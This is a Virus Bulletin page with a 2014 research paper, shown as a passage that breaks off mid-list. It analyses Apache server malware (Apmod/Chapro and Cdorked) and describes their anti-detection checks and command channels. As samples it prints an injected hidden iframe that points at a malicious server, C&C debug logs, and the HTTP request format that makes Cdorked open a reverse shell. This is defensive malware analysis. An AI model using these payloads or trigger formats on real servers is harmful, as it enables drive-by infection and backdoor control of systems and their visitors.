<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: VB2014 paper: Linux-based Apache malware infections: biting the hand that serves us all</title>
<meta name="description" content="In their VB2014 paper, Cathal Mullaney and Sayali Kulkarni demonstrate that targeting Linux-based Apache web servers is an active and extremely effective method of malware infection. They present an overview of Linux malware and a technical analysis of two Apache-based infections, Trojan.Apmod and Linux.Chapro. They discuss common infection vectors for Linux servers, the payload infection chain, and final payloads distributed to clients." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 1541;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb201601-biting-the-hand"></a>VB2014 paper: Linux-based Apache malware infections: biting the hand that serves us all</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2016-01-01</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="firstname">Cathal</span> <span class="surname">Mullaney</span></h3><span class="orgname">Symantec</span>, <span class="orgdiv">Ireland</span></div><div class="author titlepage"><h3 class="author"><span class="firstname">Sayali</span> <span class="surname">Kulkarni</span></h3><span class="orgname">Symantec</span>, <span class="orgdiv">India</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Martijn</span> <span class="surname">Grooten</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>In their VB2014 paper, Cathal Mullaney and Sayali Kulkarni demonstrate that targeting Linux-based <span class="emphasis"><em>Apache</em></span> web servers is an active and extremely effective method of malware infection. They present an overview of Linux malware and a technical analysis of two Apache-based infections, Trojan.Apmod and Linux.Chapro. They discuss common infection vectors for Linux servers, the payload infection chain, and final payloads distributed to clients.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2014 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-2063" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-2063" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id3957866">Abstract</a></span></dt><dt><span class="sect1"><a href="#id2721416">1. Introduction</a></span></dt><dt><span class="sect1"><a href="#id3198428">2. Apache module infrastructure</a></span></dt><dt><span class="sect1"><a href="#id3736985">3. Trojan.Apmod</a></span></dt><dt><span class="sect1"><a href="#id3538625">4. Linux.Chapro</a></span></dt><dt><span class="sect1"><a href="#id3859186">5. Linux.Cdorked</a></span></dt><dt><span class="sect1"><a href="#id4341673">Conclusion</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3957866"></a>Abstract</h2></div></div></div><p>In May 2011, we investigated a persistent malware infection specific to a <span class="emphasis"><em>Linux</em></span> installation of the <span class="emphasis"><em>Apache</em></span> web server. The infection was unique in that it used <span class="emphasis"><em>Apache</em></span>&rsquo;s own APIs as a means to attack and infect unsuspecting clients. This attack vector was unusual as it did not target static web pages with an iframe or JavaScript injection. Instead, every web page served to a client&rsquo;s browser was dynamically modified to contain malicious content. By leveraging the <span class="emphasis"><em>Apache</em></span> module APIs and <span class="emphasis"><em>Apache</em></span> filtering framework, attackers were capable of serving malware to thousands of targeted users. Originally classified as Trojan.Apmod, the malware re-emerged in 2012 as Linux.Chapro and was ultimately identified as a component of the Darkleech exploit kit. During the past year, tens of thousands of active infections have been identified, ranging from private businesses to educational institutions and the web servers of prominent security vendors. What first appeared to be a targeted attack has since been identified as one of a growing number of <span class="emphasis"><em>Linux</em></span> malware infections. These infections, targeting <span class="emphasis"><em>Linux</em></span> installations of the <span class="emphasis"><em>Apache</em></span> web server, have proven to be a perfect vector for serving malware on a global scale.</p><p>This paper will demonstrate that targeting <span class="emphasis"><em>Linux</em></span>-based <span class="emphasis"><em>Apache</em></span> web servers is an active and extremely effective method of malware infection. We present an overview of <span class="emphasis"><em>Linux</em></span> malware and a technical analysis of two <span class="emphasis"><em>Apache</em></span>-based infections, Trojan.Apmod and Linux.Chapro. We discuss common infection vectors for <span class="emphasis"><em>Linux</em></span> servers, the payload infection chain, and final payloads distributed to clients.</p><p>A targeted <span class="emphasis"><em>Linux</em></span> malware infection, aimed at one of the most popular web servers in the world, allows malware authors to bite the hand that serves us all.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2721416"></a>1. Introduction</h2></div></div></div><p>The <span class="emphasis"><em>Linux</em></span> operating system has been growing in popularity since the first kernel release in 1991. An open-source operating system, it has grown from a part-time project to now running on 482 of the top 500 most powerful, commercially available computer systems (super computers) [<span class="citation"><a href="#citation.1">1</a></span>]. Coupled with free software bundles, such as the GNU Project, <span class="emphasis"><em>Linux</em></span> is rapidly becoming the operating system of choice for website servers.</p><p>An increasingly ubiquitous solution stack is the LAMP software bundle. LAMP stands for <span class="emphasis"><em>Linux</em></span>, <span class="emphasis"><em>Apache</em></span>, <span class="emphasis"><em>MySQL</em></span> (or another database solution) and a scripting language such as PHP, Python, Perl etc. This software bundle allows for a dynamic, reliable and scalable website infrastructure to be deployed quickly with an absolute minimum of cost. The key component in this solution is the <span class="emphasis"><em>Apache</em></span> HTTP server. The <span class="emphasis"><em>Apache</em></span> web server, much like the <span class="emphasis"><em>Linux</em></span> kernel, has grown from a small project to the dominant web server on the Internet today. While its market share is beginning to be challenged by its competitors, it remains the most popular web server currently in widespread use [<span class="citation"><a href="#citation.2">2</a></span>].</p><p>Given the widespread distribution of the <span class="emphasis"><em>Linux</em></span> operating system, coupled with the pervasive deployment of the <span class="emphasis"><em>Apache</em></span> web server, it was only a matter of time before <span class="emphasis"><em>Apache</em></span> became a target for malware authors. There are countless malware families that will infect static web pages, but threats that actively target a web server are relatively rare. When a web server is infected, every user that requests a web page from the server is a potential victim. In cases where static web pages have been infected, only users who navigate to those specific pages are at risk.</p><p>A malware infection targeting the most popular web server in use today allows for an almost unparalleled malware distribution vector. Included in this paper are the technical details for two persistent Apache web server infections that have been operating in the wild for a number of years. We detail common server-side infection vectors, the infections themselves, an analysis of the malicious payloads ultimately distributed to clients, and the payload infection chain. We also include a detailed analysis of malicious source code gathered from a forensic investigation of a live <span class="emphasis"><em>Apache</em></span> infection. We also present an analysis of the growing trend of <span class="emphasis"><em>Apache</em></span>-specific infections.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3198428"></a>2. Apache module infrastructure</h2></div></div></div><p>The <span class="emphasis"><em>Apache</em></span> HTTP server has a wide range of features and support for a number of server-side programming languages. This is mostly implemented in the form of plug-ins or compiled modules. These modules are written using the <span class="emphasis"><em>Apache</em></span> module API and allow developers to extend the base functionality of the web server with new features [<span class="citation"><a href="#citation.3">3</a></span>]. This programming interface allows developers to extend the web server without modifying or recompiling its code base. For instance, support for the scripting language PHP is provided by way of a compiled module, mod_php.</p><p>Another extremely powerful means of extending <span class="emphasis"><em>Apache</em></span>&rsquo;s core functionality is the filtering framework provided through the <span class="emphasis"><em>Apache</em></span> module, mod_filter. This module &lsquo;enables applications to process incoming and outgoing data in a highly flexible and configurable manner, regardless of where the data comes from. We can pre-process incoming data, and post-process outgoing data, at will. This is basically independent of the traditional request processing phases&rsquo; [<span class="citation"><a href="#citation.4">4</a></span>]. This filtering API allows programmers to inspect and alter data that is sent to and from the web server.</p><p>A hosting company that includes advertisements in its clients&rsquo; web pages can make use of this type of output filtering. A client may create a website on a web server. When a web page is requested, the output filter automatically embeds an advertisement into the served page. In this way, the web server is inspecting and modifying outgoing data dynamically in order to add advertisements to its clients&rsquo; web pages.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3736985"></a>3. Trojan.Apmod</h2></div></div></div><p>In May 2011 [<span class="citation"><a href="#citation.5">5</a></span>], we were informed of a malware infection that leveraged this module/filtering framework to infect the <span class="emphasis"><em>Apache</em></span> HTTP server. The rogue module and associated source code was presented to us for analysis as the result of a forensic investigation into a compromised server. The <span class="emphasis"><em>Apache</em></span> infection used identical steps to the use case presented in Section 2. The ultimate goal of the malware was to inject an iframe containing links to malicious websites in response to legitimate web page requests. All of the actions performed by the rogue module were done using legitimate code provided as part of the <span class="emphasis"><em>Apache</em></span> module and filtering framework. These APIs are provided specifically for this type of dynamic content generation. The methods used were not an exploit or hack of the <span class="emphasis"><em>Apache</em></span> HTTP server; the authors used <span class="emphasis"><em>Apache</em></span>&rsquo;s inherent functionality to attempt to redirect legitimate end-users to malicious websites.</p><p>As we investigated the compiled module and the associated source code, we concluded that the module was highly configurable and even included a debug mode. In the sample recovered during the forensic investigation, the module logged its output to a file in /var/tmp. During our analysis, we concluded that the module did not infect web pages blindly, but rather contained a number of checks for user-agents, IPs and administrator processes. This was done in order to hinder detection and to allow the module to remain on the infected server for as long as possible.</p><p>A typical execution of the module involves the following steps:</p><div class="orderedlist"><ol type="1"><li><p>A user connects to the compromised web server running the rogue module and requests a web page.</p></li><li><p>The rogue module checks the type of content requested by the user.</p></li><li><p>Once an HTML web page has been requested, the rogue module begins its infection process.</p></li><li><p>The rogue module performs a number of anti detection checks, including:</p><div class="orderedlist"><ol type="a"><li><p>Checks for the presence of an admin user or process.</p></li><li><p>Checks for a number of blacklisted browser user-agents.</p></li><li><p>Checks for bad IP address ranges (known search engine IP address ranges &ndash; this prevents the rogue module serving infected pages to search engines, avoiding potential page blocking).</p></li><li><p>Checks for banned IP addresses.</p></li><li><p>Checks for the presence of a root or a user running sudo (using /var/run/utmp).</p></li><li><p>Checks for the presence of processes likely to detect the infection (tcpdump, rkhunter).</p></li></ol></div></li><li><p>Once the anti-detection checks have passed successfully, the rogue module creates a new session for the target browser, but does not infect it right away.</p></li><li><p>Only on a subsequent request for a web page will the infection execute.</p></li><li><p>The rogue module will then query an external command-and-control (C&amp;C) server for a new iframe tag.</p></li><li><p>Once an active iframe tag has been returned, it is inserted into the requested web page and served to the user.</p></li><li><p>The user&rsquo;s IP address is added to a temporary ban list to prevent multiple infections and further hamper detection.</p></li></ol></div><p>The injected iframe tag has a format similar to the following:</p><pre class="programlisting">&lt;style&gt;
.nhie96r8 {
    position:absolute;
    left:-1140px;
    top:-1003px
}
&lt;/style&gt;

&lt;div class=&rdquo;nhie96r8&rdquo;&gt;
&lt;iframe src= &ldquo;[http://]malframeserver.cz.cc/myi986px/count[REMOVED]&rdquo;&gt;
&lt;/iframe&gt;
&lt;/div&gt;
</pre><p>We then enabled the debug output mode of the <span class="emphasis"><em>Apache</em></span> module provided by the malware author. The module begins by running the mentioned IP address and user-agent checks:</p><div class="orderedlist"><ol type="1"><li><pre class="programlisting">192.168.1.1 --------------- Starting, IP = 192.168.1.1, r-&gt;the_request = GET /HTTP/1.1</pre></li><li><pre class="programlisting">192.168.1.1 Check blacklist IP=192.168.1.1, filename=/var/tmp/sess_f528764d624db129b32c21fbca0cb8d6 - file absent, OK</pre></li><li><pre class="programlisting">192.168.1.1 Check temp banlist IP=192.168.1.1, filename=/var/tmp/sess_f83c9c7e5bd2f2834893da8a5f03b58b - file absent, OK</pre></li><li><pre class="programlisting">192.168.1.1 Begin check User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.16) Gecko/20110323 Ubuntu/10.04 (lucid) Firefox/3.6.16</pre></li></ol></div><p>Once the IP address and user-agent checks pass, the module is ready to start serving malware on subsequent requests. The malware will wait for a new request from a previously logged IP address from the first stage of the protocol, add that IP address to the temporary ban list, and contact the C&amp;C server.</p><div class="orderedlist"><ol type="1"><li><pre class="programlisting">192.168.1.1 Loading session: IP = 192.168.1.1, SessFilename = /var/tmp/sess_499b95eea599df1950b335b8b4e3ea8b, mode.modetype = 2, mode.key = 1107430144, mode.time = 1303461948, ClientKey = 1107430144</pre></li><li><pre class="programlisting">192.168.1.1 Check temp banlist IP=192.168.1.1, filename=/var/tmp/sess_f83c9c7e5bd2f2834893da8a5f03b58b - file absent, OK</pre></li><li><pre class="programlisting">192.168.1.1 Adding to temp banlist</pre></li><li><pre class="programlisting">192.168.1.1 hostname:cnc.com, servname:(null), port:80, family:2</pre></li><li><pre class="programlisting">Sending tds-request = GET /t/?sid=a-host.com HTTP/1.1</pre></li></ol></div><p>During our initial testing, we determined that the malicious iframe was meant to redirect the victim&rsquo;s browser to an exploit landing page. The exploit would then attempt to infect the victim&rsquo;s computer and allow the installation of further malware. As the module contained a number of checks to hinder detection, it is possible that a web server could remain infected for an extended period of time. This was further complicated by the dynamic nature of the infection. As no static HTML files were infected, detections of infected HTML files stored on disk were not feasible. The module also blacklisted a large number of search engine user-agents and IP address ranges to prevent the serving of infected pages to search engine crawlers. This was done to extend the life of the infection and prevent automated detection of infected servers.</p><p>During our initial investigation we had concluded that this was a one-off targeted attack against a specific web server. We acknowledged that the module was highly configurable and had the potential to be deployed on a larger scale, but our initial investigations suggested it was not widely deployed.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3538625"></a>4. Linux.Chapro</h2></div></div></div><p>Some months after the publication of our original research, we were contacted unexpectedly by a university system administrator who suggested the university&rsquo;s web servers were infected by Trojan.Apmod. While working with the system administrator to clean the infected servers, we were provided with a module sample which we confirmed to be Apmod. The configuration of the module was startlingly similar to the original sample upon which we had based our initial publication. We concluded that the module itself must have been part of a bigger overall exploit package and more widespread than we originally thought. ]</p><p>In December 2012, we were asked to investigate samples relating to a blog post published by <span class="emphasis"><em>ESET</em></span> [<span class="citation"><a href="#citation.6">6</a></span>]. On investigation of these samples, and after reading the associated write-up, we confirmed that Apmod had re-emerged and had been renamed to Linux.Chapro. We subsequently undertook a reinvestigation of Apmod/Chapro. During the course of the investigation we concluded that the rogue module was actually a component of the Darkleech exploit kit. We further discovered that the Darkleech exploit kit was available for sale on a number of underground malware forums.</p><p>Reports of Darkleech advertisements began to emerge in 2012. The advertising campaign included an overview of the rogue module&rsquo;s functionality and capabilities. Interestingly, the author even included links to our original writeup of the rogue malware, which he described as part of his &lsquo;client reviews&rsquo;. The advertisement went on to describe the building and installation process for the rogue module and gave a hefty price tag of US$1,000. The author also included a number of download/infection statistics describing the overall efficacy of his module. The most interesting part was that the author described the module as having been in private use for two years before the date of the advertisement, and that it was currently on its 14th version.</p><p>Seeing the description of 14 different versions of the module, we decided to investigate its evolution over time. We began with our initial investigation, through to its rebranding as Chapro, to the most recent variants that have been observed in the wild, with a 2013 version stamp.</p><p>As we investigated more samples of the Apmod malware we began to notice a slight evolution in the samples we were coming across. Most strings in the compiled modules are encrypted by a simple XOR function using a static key of varying length among samples. In the newer samples, we began to see the addition of a version string in the compiled module. The version string consisted of a 10-byte string identifying the release date of the module version. This module version string allows the malware author to track versions of his software and push updates of the malware source code, and builder, to his customers.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3859186"></a>5. Linux.Cdorked</h2></div></div></div><p>In April 2013, a new <span class="emphasis"><em>Apache</em></span> malware infection began to emerge. This infection, identified as Linux.Cdorked [<span class="citation"><a href="#citation.7">7</a></span>], used a different attack vector from Apmod. Whereas Apmod infected the <span class="emphasis"><em>Apache</em></span> web server by adding a malicious module to the server&rsquo;s configuration file, Cdorked used a more archaic form of infection. In a throwback to the original definition of the term &lsquo;rootkit&rsquo;, this infection replaced the <span class="emphasis"><em>Apache</em></span> server&rsquo;s primary binary file, httpd. We again determined that the ultimate goal of this infection was to allow the patched version of httpd to serve unsuspecting users links to malicious websites. As before, the malicious activity and redirection was in response to web page requests from legitimate users.</p><p>While Cdorked&rsquo;s patched version of the httpd binary is quite a different infection from Apmod, it shares a number of surprising similarities. Cdorked infections operate in a similar fashion to Apmod in that no static HTML files are modified on disk. Much like the stealthy Apmod infections, malicious links are inserted into HTML files in response to legitimate requests. However, Cdorked takes its stealth tactics to new heights by ensuring no configuration files are stored on disk. Instead, Cdorked stores all of its configuration information in a shared memory segment which is then operated on by the modified httpd binary.</p><p>The patched httpd binary uses a large block of shared memory to store its configuration. This shared memory block stores a number of encrypted values that are used as part of the infected server&rsquo;s configuration. These configuration parameters are encrypted in the shared memory segment in an attempt to hide the server infection. This shared memory segment can easily be spotted by running the command &lsquo;ipcs -m&rsquo; on an infected server:</p><pre class="programlisting">ipcs -m
------ Shared Memory Segments ------
key        shmid  owner  perms bytes   nattch
0x00003113 655364 apache 600   6535280 1
</pre><p>The shared memory segment is also highly configurable by a remote user. A number of remote commands accepted by the infected <span class="emphasis"><em>Apache</em></span> instance allow for the modification of this shared configuration memory segment. Using remote commands, encoded in HTTP request headers, a remote user can update this configuration using an HTTP POST request. In this way attackers can read the infection&rsquo;s current status and tune configurations remotely. The Cdorked infection also prevents the remote command strings from being recorded in the <span class="emphasis"><em>Apache</em></span> log files. These log files are often the first stop for an administrator who is trying to investigate a server they suspect of being misconfigured or infected. By ensuring the command strings are not logged by the infected <span class="emphasis"><em>Apache</em></span> server, the malware authors make diagnosing a Cdorked infection more difficult, and ensure that the infection will persist as long as possible.</p><p>While Cdorked&rsquo;s ultimate payload was similar to Apmod&rsquo;s end goal, the two infections differed in a number of key respects. One of Cdorked&rsquo;s most notable capabilities was that it also functioned as a backdoor to the compromised web server. This was an interesting departure from the type of infections we had previously seen. While backdoors are quite common in <span class="emphasis"><em>Windows</em></span> malware, and not uncommon in <span class="emphasis"><em>Linux</em></span> malware, this was a relatively unique case of the <span class="emphasis"><em>Apache</em></span> web server being leveraged in this way. The Cdorked infection was capable of responding to remote commands from an attacker and also of opening a remote shell, or backdoor, in response to a particular command string. A reverse shell is a connection from the infected web server back to a computer of the attacker&rsquo;s choosing. Once this connection is made, the attacker is granted a large amount of control on the infected machine. This also means that if the original access point is patched or closed, the attacker retains access to the infected computer.</p><p>While a typical HTTP request may have the following format:</p><pre class="programlisting">GET /a_uri.html HTTP/1.1
Host: a.clean.host
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0
Accept: text/css,*/*;q=0.1
Accept-Language: en-gb,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://a.normal.referer
Connection: keep-alive
</pre><p>Cdorked was capable of parsing and responding to custom commands encoded into HTTP request headers. This was also how the backdoor and reverse shell was triggered on the infected server. In order for a remote attacker to trigger a reverse shell, a request of the following format could be sent to the infected server:</p><pre class="programlisting">GET /favicon.iso?4745545f4241434b3b3132372e302e302e313b31323334 HTTP/1.1
Host: an.infected.host
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0
Accept: text/css,*/*;q=0.1
Accept-Language: en-gb,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://a.normal.referer
X-Real-IP: 123.321.123.321
</pre><p>On receipt of this request, the infected httpd binary parses the X-Forwarded-For or X-Real-IP HTTP header for an IP address (though, as in the example above, not necessarily a valid one). This IP address is then parsed and used as a decryption key for the crafted GET request parameters. The IP address is decoded as follows:</p><div class="itemizedlist"><ul type="disc"><li><pre class="programlisting">First octet + 0x5 + second octet + 0x21 + third octet + 0x37 + fourth octet + 0x4E</pre></li></ul></div><p>In the example given above, the XOR encryption has been omitted for the sake of clarity. All calls to the infected web server are presented in hex-encoded plain text only.</p><div class="itemizedlist"><ul type="disc"><li><pre class="programlisting">GET /favicon.iso?4745545f4241434b3b3132372e302e302e313b31323334</pre></li></ul></div><p>Once the decryption key has been parsed, it is then used to XOR the HTTP Get request string arguments. After the decryption occurs, we are left with the following values (decoded from hexadecimal to plain text):</p><div class="itemizedlist"><ul type="disc"><li><pre class="programlisting">GET /favidon.iso?GET_BACK;127.0.0.1;1234</pre></li></ul></div><p>This command is used to spawn a reverse shell from the infected server and connect back to the specified IP address at the specified port number.</p><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="Cdorked decrypted commands." src="/uploads/images/figures/2016/01/MullaneyKulkarni-1.jpg" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;Cdorked decrypted commands.</b></p></div><p>(Click <a href="/uploads/images/figures/2014/12/MullaneyKulkarni-1.jpg" target="_top">here</a> to view a larger version of Figure 1.)</p><p>The infected httpd binary is also configurable by way of commands encoded in HTTP post request headers. Cdorked can potentially recognize up to 23 configuration command strings. These commands are generally used to write or delete values from the infection&rsquo;s configuration stored in the allocated shared memory segment. A configuration command request is triggered by sending a post request to a URL with a predetermined structure. Command URL string formats differ from sample to sample, but generally consist of three specific characters at predetermined offsets in the URL. As before, the IP address set in the X-Forwarded-For or X-Real-IP is used as an XOR decryption key for the embedded commands.</p><pre class="programlisting">POST /abcdepfgmijklmno?5354 HTTP/1.1
Host: an.infected.host
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0
Accept: text/css,*/*;q=0.1
Accept-Language: en-gb,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://a.normal.referer
X-Real-IP: 123.321.123.321
Cookie: SECID=
</pre><p>In this case, the encrypted commands are only processed if the requested URL matches the mentioned pattern and a secid cookie is present in the request. Once the request is accepted by the infected server, the command is decrypted and checked against the list of commands supported by the infected server:</p><div class="itemizedlist"><ul type="disc"><li><p>DU</p></li><li><p>ST</p></li><li><p>T1</p></li><li><p>L1</p></li><li><p>D1</p></li><li><p>L2</p></li><li><p>D2</p></li><li><p>L3</p></li><li><p>D3</p></li><li><p>L4</p></li><li><p>D4</p></li><li><p>L5</p></li><li><p>D5</p></li><li><p>L6</p></li><li><p>D6</p></li><li><p>L7</p></li><li><p>D7</p></li><li><p>L8</p></li><li><p>D8</p></li><li><p>L9</p></li><li><p>D9</p></li><li><p>LA</p></li><li><p>DA</p></li></ul></div><p>These commands allow a malicious user to fully configure the infection remotely. The accepted commands allow the storage and deletion of: a number of blacklists (user-agent, referrers), the list of infected users, and the configuration of redirection IP addresses that are ultimately served to the targeted end-users. The Cdorked infection then responds to these commands by setting the ETAG header with the server&rsquo;s response as follows:</p><pre class="programlisting">HTTP/1.1 302 Found
Date: Mon, 02 Jun 2014 18:40:06 GMT
Server: Apache/2.2.26 (Unix)
Location: http://google.com/
ETag: 11111-11111-11111; 00-0-0-1-0-1-0-0-0-0-0-0-0-0
Content-Length: 202
Content-Type: text/html; charset=iso-8859-1
&lt;!DOCTYPE HTML PUBLIC &ldquo;-//IETF//DTD HTML 2.0//EN&rdquo;&gt;
&lt;html&gt;&lt;head&gt;
&lt;title&gt;302 Found&lt;/title&gt;
&lt;/head&gt;&lt;body&gt;
&lt;h1&gt;Found&lt;/h1&gt;
&lt;p&gt;The document has moved &lt;a href=&rdquo;http://google.com/&rdquo;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;/body&gt;&lt;/html&gt;
</pre><p>While a Cdorked infection allows a large amount of control over the infected server, the ultimate goal of the malware is to serve malicious links to unsuspecting users. Interestingly, Cdorked uses many of the same stealth tactics as Apmod in order to remain undetected as long as possible. Before serving an infected HTML page, the server executes a number of checks. During a typical execution of an infected Apache web server, the following steps occur:</p><div class="orderedlist"><ol type="1"><li><p>On connection from a legitimate user, the infected server first checks for the presence of the HTTP header: Accept-Language.</p></li><li><p>If this header exists, the associated value is checked against a blacklist of Accept-Language values.</p></li><li><p>The server checks for the presence of the HTTP header: Accept-Encoding.</p></li><li><p>The infected server will then check for the presence of the HTTP Referer header.</p></li><li><p>The referrer&rsquo;s structure is subsequently checked and matched against a blacklist. This check ensures a one-off connection from a client will not be served a malicious web page. This also allows the malware authors to control what end user is served malicious redirects.</p></li><li><p>The Cdorked server will then inspect the request type for the following range of values:</p><div class="itemizedlist"><ul 